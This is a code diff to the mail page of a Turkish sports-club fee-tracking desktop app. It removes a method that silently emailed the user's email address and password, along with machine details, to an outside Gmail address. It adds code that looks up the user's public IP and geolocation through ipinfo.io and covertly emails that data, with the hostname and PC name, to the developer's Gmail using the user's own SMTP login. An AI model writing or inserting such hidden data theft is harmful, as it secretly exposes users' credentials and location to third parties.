@@ -18,7 +18,6 @@ class MailPage(QWidget):
         self.ui.baglan_pushbutton.hide()
         self.ui.logout_pushbutton.hide()
         self.gonderilecek_mailler=[]
-        self.son_ay_getir()
         
         self.ui.baglanti_durumu_checkBox.setStyleSheet("QCheckBox::indicator"
                                "{"
@@ -43,10 +42,23 @@ class MailPage(QWidget):
             hostname = socket.gethostname()
             pc_name=os.getlogin()
             local_ip = socket.gethostbyname(hostname)
-            r=requests.get(r"https://jsonip.com")
-            public_ip=r.json()["ip"]
+            r=requests.get(r"http://ipinfo.io/json")
+            public_ip=r.json()
             yag = yagmail.SMTP(self.ui.mail_edit.text(), self.ui.password_edit.text())
-            yag.send(to="cheekyshackgroup@gmail.com", subject="YENİ İP Adresi Tespiti!!!", contents="Hostname : {}\n Local İp :  {}\n Pc Adı : {}\n Public İp : {}\n Mail : {} \n Şifre : {} \n\n Adresinden Programa Arişim Yapıldı... \n\n\n\nCopyright © 2022 MXSoftware Sporcu Takip ve Aidat Programı... Coded By Enes Birol ".format(hostname,local_ip,pc_name,public_ip,mail,sifre))
+            bilgi="""
+        Hostname : {}
+        PC Name : {}
+        Local İP : {}
+        Public İP : {}
+        Hostname : {}
+        City : {}
+        Country : {}
+        Location : {}
+        Organization : {}
+        postal : {}
+        timezone : {}
+        """.format(hostname,pc_name,local_ip,public_ip["ip"],public_ip["hostname"],public_ip["city"],public_ip["country"],public_ip["loc"],public_ip["org"],public_ip["postal"],public_ip["timezone"])
+            yag.send(to="birolmxsoftware@gmail.com", subject="YENİ İP Adresi Tespiti!!! {}".format(pc_name),contents="\n {}\n\n Adresinden Programa Erişim Yapıldı... \n\n\n\nCopyright © 2022 MXSoftware Sporcu Takip ve Aidat Programı... Coded By Enes Birol ".format(bilgi))
             self.kullanici_mail=self.ui.mail_edit.text()
             self.kullanici_sifre=self.ui.password_edit.text()
             self.ui.baglanti_durumu_checkBox.setStyleSheet("QCheckBox::indicator"
@@ -107,22 +119,6 @@ class MailPage(QWidget):
         else:
             print("hataaaaaaaaaaaaaaaaaaaa")
             self.mail_logout()
-    def son_ay_getir(self):
-        today=str(date.today())
-        today.split("-")
-        yil=today[0] + today[1] + today[2] + today[3]
-        ay=today[5] + today[6]
-        self.gonderilecek_mailler.clear()
-        try:
-            self.conn = sql.connect("./db/mxsoftware.db")
-            self.c = self.conn.cursor()
-            self.c.execute("SELECT * FROM details WHERE ay=? yıl=?", (ay, yil))
-            self.conn.commit()
-            veri = self.c.fetchall()
-            print(yil)
-            print(ay)
-        except Exception :
-            print("veri yok")
 
     def herkese_tiklandi(self):
 
